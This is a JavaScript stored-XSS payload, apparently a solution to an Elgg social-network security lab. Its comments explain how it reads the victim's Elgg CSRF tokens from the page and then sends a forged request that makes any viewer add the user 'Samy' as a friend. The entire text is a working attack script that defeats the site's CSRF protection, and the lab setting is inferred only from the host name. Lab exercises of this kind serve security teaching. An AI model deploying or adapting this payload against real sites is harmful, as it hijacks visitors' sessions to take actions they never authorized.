window.onload = function () {
    var Ajax=null;

    // This data is sent by the server (look at the page's source code!)
    // and must be included in subsequent requests.
    var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;           // (1) elgg CSRF countermeasure
    var token="&__elgg_token="+elgg.security.token.__elgg_token;  // (2) elgg CSRF countermeasure

    // Construct the HTTP request to add Samy as a friend.

    var sendurl="http://www.xsslabelgg.com/action/friends/add" + "?friend=59" + token + ts;

    Ajax=new XMLHttpRequest();
    Ajax.open("GET",sendurl,true);
    Ajax.setRequestHeader("Host","www.xsslabelgg.com");
    Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
    Ajax.send();
}
